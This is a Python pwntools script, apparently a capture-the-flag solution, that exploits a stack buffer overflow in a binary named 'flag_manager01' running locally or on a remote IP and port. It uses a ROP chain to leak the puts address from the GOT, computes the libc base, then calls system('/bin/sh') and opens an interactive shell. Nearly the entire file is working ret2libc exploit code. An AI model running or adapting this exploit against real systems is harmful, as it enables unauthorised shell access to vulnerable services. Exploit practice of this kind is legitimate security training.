from pwn import *
from LibcSearcher import LibcSearcher
import sys

config = {
    "elf" : "./flag_manager01",
    "libc" : "./libc-2.27.so",
    "ld" : "./ld-2.27.so",
    "HOST" : "89.38.208.144",
    "PORT" : 11115,
}

def exploit(p):
	padding = "\x90"*88
	main = elf.symbols['main']
	puts_got = elf.got['puts']
	puts_plt = elf.plt['puts']

	pop_rdi = elf.search(asm("pop rdi ; ret")).next()
	pop_rsi_r15 = elf.search(asm("pop rsi ; pop r15 ; ret")).next()

	payload = padding 
	payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
	sla("Enter your name: ", payload)
	sla("Enter password please: ", '') 

	p.recvline()
	p.recvline()

	puts = u64(p.recvline().strip() + '\x00'*2)
	base = puts - libc.symbols['puts']
	system = base + libc.symbols['system']
	sh = base + libc.search("/bin/sh\x00").next()

	payload = padding + p64(pop_rdi) + p64(sh) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(system)

	sla("Enter your name: ", payload)
	sla("Enter password please: ", '')
	 
	lg("SYSTEM: " + hex(system))
	lg("BASE: " + hex(base))
	p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])

    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    if sys.argv[-1] == "remote":
        p = remote(config["HOST"], config["PORT"])
    else:
        if "libc" in dir(): 
            p = process([config["ld"], config["elf"]], env={"LD_PRELOAD" : config["libc"]})
        else: 
            p = process(config["elf"])

        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    r = lambda a: p.recv(a)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
